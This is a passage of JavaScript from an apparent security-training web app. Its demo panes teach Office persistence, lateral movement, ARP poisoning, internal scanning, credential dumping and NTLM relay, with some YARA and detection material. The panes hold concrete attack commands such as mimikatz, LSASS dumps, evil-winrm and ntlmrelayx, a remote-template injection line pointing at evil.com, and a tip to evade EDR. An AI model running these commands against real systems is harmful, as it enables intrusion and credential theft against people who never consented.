            templates: 'TEMPLATE PERSISTENCE:\n\n╔═══════════════════════════════════════════════════════╗\n║ Global Template Injection                             ║\n╚═══════════════════════════════════════════════════════╝\n\nWord Global Template (Normal.dotm):\n  Location:\n  %APPDATA%\\Microsoft\\Templates\\Normal.dotm\n\n  # Every Word doc inherits from Normal.dotm\n  # Add macro here = runs on ALL documents!\n\nRemote Template Injection:\n  # Document loads template from URL\n  <Relationship Type="...attachedTemplate"\n    Target="http'+'://evil.com/template.dotm"\n    TargetMode="External"/>\n\n  # When doc opens:\n  1. Fetches remote template\n  2. Executes macros from template\n  3. Original doc appears clean!\n\nExcel Add-in Location:\n  %APPDATA%\\Microsoft\\Excel\\XLSTART\\\n  # .xla/.xlam files auto-load\n\nOutlook Forms:\n  # VBScript in custom forms\n  # Triggers on email view/send',
            addins: 'OFFICE ADD-IN PERSISTENCE:\n\n╔═══════════════════════════════════════════════════════╗\n║ Add-in Auto-Load Locations                            ║\n╚═══════════════════════════════════════════════════════╝\n\nExcel:\n  %APPDATA%\\Microsoft\\Excel\\XLSTART\\\n  %APPDATA%\\Microsoft\\AddIns\\\n  Registry: HKCU\\Software\\Microsoft\\Office\\\n            <version>\\Excel\\Options\\OPEN\n\nWord:\n  %APPDATA%\\Microsoft\\Word\\STARTUP\\\n  Registry: HKCU\\Software\\Microsoft\\Office\\\n            <version>\\Word\\Options\\STARTUP-PATH\n\nCOM Add-ins (All Office):\n  HKCU\\Software\\Microsoft\\Office\\<app>\\Addins\\\n    <addin.progid>\\\n      LoadBehavior = 3 (auto-load)\n      FriendlyName = "Legit Addin"\n      Manifest = "C:\\path\\addin.dll"\n\nVSTO Add-ins:\n  • .vsto deployment files\n  • Signed or unsigned\n  • Registry-based loading\n\n⚠️ Runs with Office privileges\n⚠️ Trusted location = no warnings',
            detect: 'OFFICE PERSISTENCE DETECTION:\n\n╔═══════════════════════════════════════════════════════╗\n║ Detection Methods                                     ║\n╚═══════════════════════════════════════════════════════╝\n\n1. Check Auto-Load Locations:\n   dir "%APPDATA%\\Microsoft\\Templates\\*.dot*"\n   dir "%APPDATA%\\Microsoft\\Excel\\XLSTART\\*"\n   dir "%APPDATA%\\Microsoft\\Word\\STARTUP\\*"\n\n2. Registry Analysis:\n   reg query "HKCU\\Software\\Microsoft\\Office"\n       /s /f LoadBehavior\n\n3. Macro Analysis Tools:\n   • olevba (oletools)\n     olevba document.docm\n   • OfficeMalScanner\n   • ViperMonkey (emulation)\n\n4. Suspicious Indicators:\n   • AutoOpen, Document_Open macros\n   • Shell(), CreateObject()\n   • PowerShell, cmd.exe execution\n   • Base64 encoded strings\n   • Obfuscated VBA code\n\n5. Prevention:\n   • Disable macros by default\n   • Block macros from internet\n   • ASR rules (Windows Defender)\n   • Application whitelisting\n\nGPO: Block macros in files from internet'
        };
        $('#officeOut').textContent = data.macros;
        $$('#officeTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#officeTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#officeOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 7: yara-rules - YARA Rules
    function demoYaraRules(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">DETECTION</span><span class="demo-title">YARA Rules</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="yaraTabs">
                <button class="demo-btn demo-btn-sm active" data-t="syntax">YARA Syntax</button>
                <button class="demo-btn demo-btn-sm" data-t="writing">Rule Writing</button>
                <button class="demo-btn demo-btn-sm" data-t="examples">Examples</button>
                <button class="demo-btn demo-btn-sm" data-t="usage">Detection Usage</button>
            </div>
            <div id="yaraOut" style="background:#1a1a1a;color:#00ff88;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            syntax: 'YARA RULE SYNTAX:\n\n╔═══════════════════════════════════════════════════════╗\n║ YARA = Pattern Matching for Malware Researchers       ║\n╚═══════════════════════════════════════════════════════╝\n\nBasic Structure:\n  rule RuleName {\n      meta:\n          description = "What this rule detects"\n          author = "Your name"\n          date = "2024-01-01"\n          severity = "high"\n      \n      strings:\n          $string1 = "malicious text"\n          $string2 = { 6D 61 6C 77 61 72 65 }  // hex\n          $string3 = /regex[0-9]+pattern/\n      \n      condition:\n          any of them\n  }\n\nString Types:\n  • Text:    $s = "plaintext"\n  • Hex:     $h = { 4D 5A 90 00 }  // MZ header\n  • Regex:   $r = /password[0-9]{4}/i\n  • Wide:    $w = "text" wide  // UTF-16\n  • ASCII:   $a = "text" ascii',
            writing: 'WRITING EFFECTIVE YARA RULES:\n\n╔═══════════════════════════════════════════════════════╗\n║ Rule Writing Best Practices                           ║\n╚═══════════════════════════════════════════════════════╝\n\nString Modifiers:\n  $s1 = "MalWare" nocase     // Case insensitive\n  $s2 = "text" wide          // UTF-16LE\n  $s3 = "text" ascii wide    // Both encodings\n  $s4 = "text" fullword      // Word boundaries\n  $s5 = "base64" base64      // Base64 encoded\n\nCondition Operators:\n  • any of them         - Any string matches\n  • all of them         - All strings match\n  • 2 of ($a*)          - 2 of strings starting $a\n  • #s1 > 5             - String $s1 appears 5+ times\n  • @s1 < 100           - $s1 in first 100 bytes\n  • filesize < 1MB      - File size condition\n  • uint16(0) == 0x5A4D - MZ header check\n\nCombining Conditions:\n  condition:\n      uint16(0) == 0x5A4D and  // Is PE file\n      filesize < 500KB and     // Small file\n      2 of ($suspicious*) and  // 2+ suspicious\n      any of ($api*)           // API usage',
            examples: 'YARA RULE EXAMPLES:\n\n// Detect PowerShell Download Cradle\nrule PowerShell_Downloader {\n    meta:\n        description = "PowerShell download pattern"\n    strings:\n        $ps1 = "powershell" nocase\n        $dl1 = "DownloadString" nocase\n        $dl2 = "DownloadFile" nocase\n        $dl3 = "WebClient" nocase\n        $dl4 = "Invoke-WebRequest" nocase\n        $enc = "-enc" nocase\n        $bypass = "-ep bypass" nocase\n    condition:\n        $ps1 and (any of ($dl*)) and\n        (any of ($enc, $bypass))\n}\n\n// Detect Cobalt Strike Beacon\nrule CobaltStrike_Beacon {\n    strings:\n        $s1 = { 4D 5A }  // MZ header\n        $s2 = "%s (admin)" wide\n        $s3 = "beacon.dll" ascii\n        $cfg = { 00 01 00 01 00 02 }\n    condition:\n        $s1 at 0 and 2 of ($s2, $s3, $cfg)\n}',
            usage: 'YARA FOR MALWARE DETECTION:\n\n╔═══════════════════════════════════════════════════════╗\n║ Using YARA in Security Operations                     ║\n╚═══════════════════════════════════════════════════════╝\n\nCommand Line Usage:\n  # Scan single file\n  yara rules.yar malware.exe\n\n  # Scan directory recursively\n  yara -r rules.yar /path/to/scan/\n\n  # Scan running processes\n  yara -p rules.yar\n\n  # Output matching strings\n  yara -s rules.yar suspect.bin\n\nIntegration Points:\n  • SIEM/SOAR automation\n  • Malware sandboxes (Cuckoo, Any.Run)\n  • Threat intelligence platforms\n  • EDR solutions\n  • Email gateways\n  • Network IDS (Suricata)\n\nYARA Resources:\n  • VirusTotal Hunting (premium)\n  • YARA-Rules GitHub repository\n  • Malpedia rule collection\n  • Florian Roth\'s signature-base\n\n⚠️ Test rules against goodware!\n⚠️ Avoid overly broad patterns\n⚠️ Balance detection vs false positives'
        };
        $('#yaraOut').textContent = data.syntax;
        $$('#yaraTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#yaraTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#yaraOut').textContent = data[b.dataset.t];
            };
        });
    }

    // Backward compatibility
    function demoPersistence(pane) { demoPersistenceIntro(pane); }

    // C10 Lesson 1: lateral-movement-intro - Introduction to Lateral Movement
    function demoLateralMovementIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">ATTACK</span><span class="demo-title">Introduction to Lateral Movement</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="latIntroTabs">
                <button class="demo-btn demo-btn-sm active" data-t="what">What Is It</button>
                <button class="demo-btn demo-btn-sm" data-t="why">Why Attackers Do It</button>
                <button class="demo-btn demo-btn-sm" data-t="mitre">MITRE ATT&CK</button>
            </div>
            <div id="latIntroOut" style="background:#0d1117;color:#ff7b72;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'WHAT IS LATERAL MOVEMENT?\n\n┌─────────────────────────────────────────────┐\n│  Movement through network after initial     │\n│  compromise to reach high-value targets     │\n└─────────────────────────────────────────────┘\n\nAttack Chain:\n\n  Initial Access → Foothold → LATERAL MOVEMENT → Target\n       ↓              ↓              ↓              ↓\n   Phishing      Workstation    Server to      Domain\n   Exploit       Compromise     Server         Controller\n\nKey Characteristics:\n• Post-exploitation technique\n• Uses legitimate credentials/tools\n• Blends with normal network traffic\n• Goal: Access sensitive systems/data\n\n⚠️ Often hardest phase to detect',
            why: 'WHY ATTACKERS USE LATERAL MOVEMENT:\n\n1. INITIAL TARGET HAS LIMITED VALUE\n   ├─ User workstation → No sensitive data\n   ├─ Need access to servers, databases\n   └─ Domain controllers = ultimate target\n\n2. ESCALATE PRIVILEGES\n   ├─ Find admin credentials\n   ├─ Harvest service accounts\n   └─ Compromise domain admins\n\n3. REACH HIGH-VALUE ASSETS\n   ├─ Database servers (customer data)\n   ├─ File servers (intellectual property)\n   ├─ Email servers (communications)\n   └─ Backup servers (all the data!)\n\n4. ESTABLISH PERSISTENCE\n   ├─ Multiple footholds\n   ├─ If one is found, others remain\n   └─ Harder to fully remediate\n\n⚠️ Average dwell time: 200+ days',
            mitre: 'MITRE ATT&CK - LATERAL MOVEMENT (TA0008):\n\nTechnique ID    │ Name\n────────────────┼──────────────────────────\nT1021.001      │ Remote Desktop Protocol\nT1021.002      │ SMB/Windows Admin Shares\nT1021.003      │ Distributed COM\nT1021.004      │ SSH\nT1021.005      │ VNC\nT1021.006      │ Windows Remote Management\nT1072          │ Software Deployment Tools\nT1080          │ Taint Shared Content\nT1534          │ Internal Spearphishing\nT1550.001      │ Application Access Token\nT1550.002      │ Pass the Hash\nT1550.003      │ Pass the Ticket\nT1563          │ Remote Service Hijacking\n\nDetection Focus:\n• Unusual authentication patterns\n• Admin tool usage anomalies\n• East-West traffic spikes'
        };
        $('#latIntroOut').textContent = data.what;
        $$('#latIntroTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#latIntroTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#latIntroOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 2: lateral-movement-tech - Lateral Movement Techniques
    function demoLateralMovementTech(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">TECHNIQUES</span><span class="demo-title">Lateral Movement Techniques</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="latTechTabs">
                <button class="demo-btn demo-btn-sm active" data-t="wmi">WMI</button>
                <button class="demo-btn demo-btn-sm" data-t="smb">SMB</button>
                <button class="demo-btn demo-btn-sm" data-t="rdp">RDP</button>
                <button class="demo-btn demo-btn-sm" data-t="winrm">WinRM</button>
                <button class="demo-btn demo-btn-sm" data-t="ssh">SSH</button>
            </div>
            <div id="latTechOut" style="background:#0d1117;color:#ff7b72;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            wmi: 'WMI (Windows Management Instrumentation):\n\n# Native Windows command\nwmic /node:192.168.1.50 /user:DOMAIN\\admin\n      process call create "cmd.exe /c whoami > C:\\out.txt"\n\n# PowerShell variant\nInvoke-WmiMethod -ComputerName TARGET -Class Win32_Process\n    -Name Create -ArgumentList "powershell.exe -enc BASE64"\n\nCharacteristics:\n├─ Fileless execution (no binary dropped)\n├─ Uses DCOM (port 135 + dynamic)\n├─ Runs as SYSTEM or specified user\n└─ Logs: WMI-Activity (5857, 5858, 5859)\n\nTools: wmiexec.py, Invoke-WMIExec, SharpWMI\n\n⚠️ Very stealthy - legitimate admin tool',
            smb: 'SMB (Server Message Block):\n\n# Admin shares (C$, ADMIN$, IPC$)\nnet use \\\\TARGET\\C$ /user:DOMAIN\\admin password\ncopy payload.exe \\\\TARGET\\C$\\Windows\\Temp\\\n\n# PsExec methodology\n1. Connect to ADMIN$ share\n2. Upload service binary\n3. Create service via SCM\n4. Start service → Execute code\n5. Cleanup (optional)\n\n# Impacket smbexec.py\npython smbexec.py DOMAIN/admin:password@TARGET\n\nPorts: 445 (SMB), 139 (NetBIOS)\nLogs: 4624, 5140, 5145, 7045\n\n⚠️ Common in enterprises - hard to block',
            rdp: 'RDP (Remote Desktop Protocol):\n\n# Enable RDP remotely\nreg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\n    \\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0\n\n# Connect with stolen creds\nmstsc /v:TARGET\nrdesktop TARGET -u admin -p password\nxfreerdp /v:TARGET /u:admin /p:password\n\n# RDP Hijacking (no password needed!)\nquery session\ntscon <ID> /dest:rdp-tcp#0\n\nPort: 3389 (TCP/UDP)\nLogs: 4624 (Type 10), 4778, 4779\n\n⚠️ GUI access = more capabilities\n⚠️ Restricted Admin Mode bypasses creds',
            winrm: 'WinRM (Windows Remote Management):\n\n# Enable WinRM\nEnable-PSRemoting -Force\nwinrm quickconfig\n\n# PowerShell Remoting\nEnter-PSSession -ComputerName TARGET -Credential $cred\nInvoke-Command -ComputerName TARGET -ScriptBlock { whoami }\n\n# Evil-WinRM (Kali)\nevil-winrm -i TARGET -u admin -p password\nevil-winrm -i TARGET -u admin -H NTLM_HASH\n\nPorts: 5985 (HTTP), 5986 (HTTPS)\nLogs: 4624, 4656, PowerShell logs (4103, 4104)\n\n⚠️ Legitimate admin protocol\n⚠️ Often enabled in enterprises\n⚠️ Supports Pass-the-Hash',
            ssh: 'SSH (Secure Shell):\n\n# Basic connection\nssh user@TARGET\nssh -i private_key user@TARGET\n\n# Pivoting - Local Port Forward\nssh -L 8080:INTERNAL:80 user@PIVOT\n# Now localhost:8080 → INTERNAL:80\n\n# Dynamic SOCKS Proxy\nssh -D 9050 user@PIVOT\nproxychains nmap -sT INTERNAL_NETWORK\n\n# Reverse Tunnel\nssh -R 4444:localhost:4444 user@PIVOT\n# PIVOT:4444 → Attacker:4444\n\nPort: 22\nLogs: auth.log, /var/log/secure\n\n⚠️ Primary method in Linux environments\n⚠️ Key-based auth leaves fewer traces'
        };
        $('#latTechOut').textContent = data.wmi;
        $$('#latTechTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#latTechTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#latTechOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 3: arp-cache-poisoning - ARP Cache Poisoning
    function demoArpCachePoisoning(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">NETWORK</span><span class="demo-title">ARP Cache Poisoning</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="arpTabs">
                <button class="demo-btn demo-btn-sm active" data-t="how">How It Works</button>
                <button class="demo-btn demo-btn-sm" data-t="tools">Tools</button>
                <button class="demo-btn demo-btn-sm" data-t="defense">Detection/Prevention</button>
            </div>
            <div id="arpOut" style="background:#0d1117;color:#ff7b72;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            how: 'ARP CACHE POISONING - HOW IT WORKS:\n\nNormal ARP:\n┌────────┐  "Who has 192.168.1.1?"  ┌────────┐\n│ Victim │ ──────────────────────→ │ Router │\n│        │ ←────────────────────── │        │\n└────────┘  "I am AA:BB:CC:DD:EE"  └────────┘\n\nARP Poisoning:\n┌────────┐                         ┌────────┐\n│ Victim │ ←── "I am the router"── │Attacker│\n│        │     (Fake ARP Reply)    │        │\n└────────┘                         └────────┘\n\nResult:\n• Victim thinks attacker is the gateway\n• All traffic flows through attacker\n• Attacker can sniff, modify, inject\n\nARP Table (Poisoned):\n  192.168.1.1  →  [Attacker MAC]  ← Should be router!\n\n⚠️ Only works on local network (Layer 2)',
            tools: 'ARP POISONING TOOLS:\n\n# arpspoof (dsniff suite)\necho 1 > /proc/sys/net/ipv4/ip_forward\narpspoof -i eth0 -t VICTIM_IP GATEWAY_IP\narpspoof -i eth0 -t GATEWAY_IP VICTIM_IP\n\n# ettercap (GUI + CLI)\nettercap -T -q -i eth0 -M arp:remote /VICTIM// /GATEWAY//\n\n# bettercap\nbettercap -iface eth0\nset arp.spoof.targets VICTIM_IP\narp.spoof on\nnet.sniff on\n\n# Scapy (Python)\nfrom scapy.all import *\npacket = ARP(op=2, pdst=victim, hwdst=victim_mac,\n             psrc=gateway)  # Lie about gateway\nsend(packet, loop=1)\n\n⚠️ Enable IP forwarding or traffic dies!',
            defense: 'DETECTION & PREVENTION:\n\nDETECTION:\n├─ arpwatch - Monitor ARP table changes\n│   arpwatch -i eth0 -f /var/lib/arpwatch/arp.dat\n│\n├─ Wireshark filter: arp.duplicate-address-detected\n│\n├─ XArp - Windows ARP spoofing detector\n│\n└─ IDS signatures for ARP anomalies\n\nPREVENTION:\n├─ Static ARP entries (doesn\'t scale)\n│   arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF\n│\n├─ Dynamic ARP Inspection (DAI) on switches\n│   - Validates ARP against DHCP snooping\n│\n├─ 802.1X Port-based authentication\n│\n├─ VLANs to limit broadcast domains\n│\n└─ Encrypted protocols (HTTPS, SSH)\n    - Can\'t read traffic even if intercepted\n\n⚠️ Layer 2 attacks = Need Layer 2 defenses'
        };
        $('#arpOut').textContent = data.how;
        $$('#arpTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#arpTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#arpOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 4: port-scanning-lateral - Internal Port Scanning
    function demoPortScanningLateral(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">RECON</span><span class="demo-title">Internal Port Scanning</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="portScanTabs">
                <button class="demo-btn demo-btn-sm active" data-t="nmap">Nmap Techniques</button>
                <button class="demo-btn demo-btn-sm" data-t="discovery">Host Discovery</button>
                <button class="demo-btn demo-btn-sm" data-t="services">Service Detection</button>
            </div>
            <div id="portScanOut" style="background:#0d1117;color:#ff7b72;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            nmap: 'NMAP INTERNAL SCANNING TECHNIQUES:\n\n# TCP SYN Scan (Stealthy, requires root)\nnmap -sS -p 22,80,443,445,3389 192.168.1.0/24\n\n# TCP Connect Scan (No root needed)\nnmap -sT -p- 192.168.1.50\n\n# UDP Scan (Slow but important)\nnmap -sU -p 53,67,68,161,500 192.168.1.0/24\n\n# Scan common ports quickly\nnmap -F 192.168.1.0/24\n\n# Aggressive scan (noisy!)\nnmap -A -T4 192.168.1.50\n\n# Low and slow (evade detection)\nnmap -sS -T1 --max-rate 10 192.168.1.0/24\n\nKey Internal Ports:\n22=SSH, 445=SMB, 3389=RDP, 5985=WinRM\n1433=MSSQL, 3306=MySQL, 5432=PostgreSQL',
            discovery: 'HOST DISCOVERY ON INTERNAL NETWORKS:\n\n# ARP Scan (fastest on local subnet)\nnmap -sn -PR 192.168.1.0/24\narp-scan -l\n\n# ICMP Echo (ping sweep)\nnmap -sn -PE 192.168.1.0/24\nfping -a -g 192.168.1.0/24\n\n# TCP Discovery\nnmap -sn -PS22,80,443,445 192.168.1.0/24\n\n# NetBIOS/SMB Discovery\nnbtscan 192.168.1.0/24\ncrackmapexec smb 192.168.1.0/24\n\n# DNS Discovery\nnmap -sL 192.168.1.0/24 | grep "(\"\n\nActive Directory:\nnmap -p 389 --script ldap-rootdse 192.168.1.0/24\n\n⚠️ Internal = Less filtering, more trust\n⚠️ ARP scan only works on local subnet',
            services: 'SERVICE & VERSION DETECTION:\n\n# Version detection\nnmap -sV -p 22,80,445,3389 192.168.1.50\n\n# Aggressive version detection\nnmap -sV --version-intensity 5 192.168.1.50\n\n# OS Detection\nnmap -O 192.168.1.50\n\n# NSE Scripts for services\nnmap --script smb-os-discovery 192.168.1.50\nnmap --script ssh-brute 192.168.1.50\nnmap --script ms-sql-info 192.168.1.50\n\nSample Output:\n PORT     STATE SERVICE      VERSION\n 22/tcp   open  ssh          OpenSSH 8.2p1\n 445/tcp  open  microsoft-ds Windows 10 Pro\n 3306/tcp open  mysql        MySQL 5.7.32\n 3389/tcp open  ms-wbt-server Microsoft RDP\n\n⚠️ Service info reveals attack surface\n⚠️ Version info → Known vulnerabilities'
        };
        $('#portScanOut').textContent = data.nmap;
        $$('#portScanTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#portScanTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#portScanOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 5: credential-extraction - Credential Extraction
    function demoCredentialExtraction(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">CREDS</span><span class="demo-title">Credential Extraction</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="credTabs">
                <button class="demo-btn demo-btn-sm active" data-t="mimikatz">Mimikatz</button>
                <button class="demo-btn demo-btn-sm" data-t="lsass">LSASS Dump</button>
                <button class="demo-btn demo-btn-sm" data-t="sam">SAM Database</button>
                <button class="demo-btn demo-btn-sm" data-t="cached">Cached Creds</button>
            </div>
            <div id="credOut" style="background:#0d1117;color:#ff7b72;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            mimikatz: 'MIMIKATZ - THE CREDENTIAL TOOL:\n\n# Run as Administrator\nmimikatz.exe\n\n# Enable debug privilege\nmimikatz # privilege::debug\nPrivilege \'20\' OK\n\n# Dump credentials from memory\nmimikatz # sekurlsa::logonpasswords\n\nAuthentication Id : 0 ; 996 (00000000:000003e4)\nSession           : Service from 0\nUser Name         : DOMAIN\\admin\nDomain            : INTERNAL\nLogon Server      : DC01\nNTLM              : aad3b435b51404eeaad3b435b51404ee\nSHA1              : da39a3ee5e6b4b0d3255bfef95601890afd80709\nWDigest           : P@ssw0rd123!\n\n# Other useful commands\nmimikatz # sekurlsa::wdigest\nmimikatz # sekurlsa::kerberos\nmimikatz # lsadump::sam\n\n⚠️ Requires local admin privileges',
            lsass: 'LSASS MEMORY DUMPING:\n\nLSASS (Local Security Authority Subsystem Service)\n├─ Stores credentials in memory\n├─ NTLM hashes, Kerberos tickets\n└─ Target for credential theft\n\n# Method 1: Task Manager (GUI)\nTask Manager → Details → lsass.exe → Create dump file\n\n# Method 2: ProcDump (Sysinternals)\nprocdump.exe -ma lsass.exe lsass.dmp\n\n# Method 3: comsvcs.dll\nrundll32.exe comsvcs.dll,MiniDump\n    [LSASS_PID] C:\\temp\\lsass.dmp full\n\n# Method 4: PowerShell\nOut-Minidump -Process (Get-Process lsass)\n\n# Extract offline with Mimikatz\nmimikatz # sekurlsa::minidump lsass.dmp\nmimikatz # sekurlsa::logonpasswords\n\n⚠️ Monitored by EDR/AV\n⚠️ Use obfuscation techniques',
            sam: 'SAM DATABASE EXTRACTION:\n\nSAM = Security Account Manager\n├─ Local Windows accounts\n├─ Stored at: C:\\Windows\\System32\\config\\SAM\n└─ Protected by SYSTEM key in SYSTEM hive\n\n# Method 1: Registry save (as admin)\nreg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive\n\n# Method 2: Volume Shadow Copy\nvssadmin create shadow /for=C:\ncp \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n   \\Windows\\System32\\config\\SAM sam.hive\n\n# Extract hashes offline\nimpacket-secretsdump -sam sam.hive -system system.hive LOCAL\n\nOutput:\nAdministrator:500:aad3b435b51404ee:31d6cfe0d16ae...\nGuest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59...\nuser:1001:aad3b435b51404ee:fc525c9683e8fe067095ba...\n\n⚠️ SAM only has LOCAL accounts, not domain',
            cached: 'CACHED DOMAIN CREDENTIALS:\n\nWhy cached credentials exist:\n├─ Allow login when DC unavailable\n├─ Stored in registry: HKLM\\Security\\Cache\n└─ Default: 10 cached logons\n\n# Mimikatz - dump cached creds\nmimikatz # lsadump::cache\n\nUser          : DOMAIN\\admin\nMsCacheV2     : $DCC2$10240#admin#a7f3e2...\n\n# secretsdump (Impacket)\nimpacket-secretsdump -cached LOCAL\n\n# Crack with hashcat\nhashcat -m 2100 hash.txt wordlist.txt\n\nFormat: $DCC2$<iterations>#<username>#<hash>\n\n⚠️ DCC2 hashes are slow to crack\n⚠️ Can\'t be used for Pass-the-Hash\n⚠️ Mitigation: Reduce cached logons\n   HKLM\\SOFTWARE\\Microsoft\\Windows NT\n   \\CurrentVersion\\Winlogon\\CachedLogonsCount = 0'
        };
        $('#credOut').textContent = data.mimikatz;
        $$('#credTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#credTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#credOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 6: mitm-lateral - Man-in-the-Middle Attacks
    function demoMITMLateral(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">MITM</span><span class="demo-title">Internal MITM Attacks</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="mitmTabs">
                <button class="demo-btn demo-btn-sm active" data-t="responder">Responder</button>
                <button class="demo-btn demo-btn-sm" data-t="relay">NTLM Relay</button>
                <button class="demo-btn demo-btn-sm" data-t="llmnr">LLMNR/NBT-NS</button>
            </div>
            <div id="mitmOut" style="background:#0d1117;color:#ff7b72;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            responder: 'RESPONDER - LLMNR/NBT-NS POISONING:\n\n# Start Responder\nresponder -I eth0 -wrf\n\nHow it works:\n1. User mistypes: \\\\FLIESHARE (instead of FILESHARE)\n2. DNS fails → LLMNR/NBT-NS broadcast\n3. Responder answers: "I\'m FLIESHARE!"\n4. Victim sends NTLMv2 hash to attacker\n\n[*] [LLMNR] Poisoned answer sent to 192.168.1.50\n[*] [SMB] NTLMv2-SSP Client   : 192.168.1.50\n[*] [SMB] NTLMv2-SSP Username : DOMAIN\\jsmith\n[*] [SMB] NTLMv2-SSP Hash     : jsmith::DOMAIN:a7d3e...\n\n# Crack captured hashes\nhashcat -m 5600 hashes.txt wordlist.txt\n\n⚠️ Passive attack - just listen!\n⚠️ Works on default Windows configs',
            relay: 'NTLM RELAY ATTACKS:\n\nInstead of cracking, RELAY the authentication!\n\n# ntlmrelayx (Impacket)\nntlmrelayx.py -t smb://192.168.1.100 -smb2support\n\nAttack Flow:\n┌────────┐    NTLM Auth    ┌──────────┐    Relay    ┌────────┐\n│ Victim │ ──────────────→ │ Attacker │ ──────────→ │ Target │\n│        │                 │          │             │        │\n└────────┘                 └──────────┘             └────────┘\n\n# Relay to dump SAM\nntlmrelayx.py -t smb://TARGET -smb2support\n\n# Relay to execute command\nntlmrelayx.py -t smb://TARGET -c "whoami"\n\n# Relay to LDAP (for AD attacks)\nntlmrelayx.py -t ldap://DC --escalate-user attacker\n\n⚠️ Requires SMB signing disabled\n⚠️ Check: crackmapexec smb RANGE --gen-relay-list',
            llmnr: 'LLMNR/NBT-NS POISONING DETAILS:\n\nName Resolution Order:\n1. Local Hosts file\n2. DNS Server\n3. LLMNR (Link-Local Multicast) ← POISONABLE\n4. NBT-NS (NetBIOS Name Service) ← POISONABLE\n\nLLMNR:\n├─ Multicast to 224.0.0.252\n├─ UDP port 5355\n└─ IPv6: FF02::1:3\n\nNBT-NS:\n├─ Broadcast to subnet\n├─ UDP port 137\n└─ Legacy NetBIOS\n\n# Disable via GPO (Prevention)\nComputer Configuration → Administrative Templates\n→ Network → DNS Client\n→ Turn off multicast name resolution: Enabled\n\n# Disable NBT-NS\nNetwork Adapter → IPv4 → Advanced → WINS\n→ Disable NetBIOS over TCP/IP\n\n⚠️ Default Windows = Vulnerable\n⚠️ Should be disabled in enterprises'
        };
        $('#mitmOut').textContent = data.responder;
        $$('#mitmTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#mitmTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#mitmOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 7: psexec-remote - Remote Command Execution
